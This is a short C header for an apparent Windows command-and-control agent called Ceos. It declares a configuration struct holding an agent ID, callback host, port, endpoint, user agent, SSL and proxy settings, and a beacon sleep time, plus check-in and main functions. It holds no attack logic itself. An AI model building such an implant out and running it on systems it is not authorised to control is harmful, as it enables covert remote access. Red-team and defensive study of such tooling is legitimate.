#pragma once
#ifndef CEOS_H
#define CEOS_H
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include "Command.h"
#include "Package.h"

#include "Parser.h"
#include "Utils.h"
#include "Checkin.h"

typedef struct
{
    // UUID
    PCHAR agentID;

    // HTTP
    PWCHAR hostName;
    DWORD httpPort;
    PWCHAR endPoint;
    PWCHAR userAgent;
    PWCHAR httpMethod;

    BOOL isSSL;
    BOOL isProxyEnabled;
    PWCHAR proxyURL;

    UINT32 sleeptime;

} CONFIG_CEOS, *PCONFIG_CEOS;

extern PCONFIG_CEOS ceosConfig;

VOID setUUID(PCHAR newUUID);
VOID ceosMain();

#endif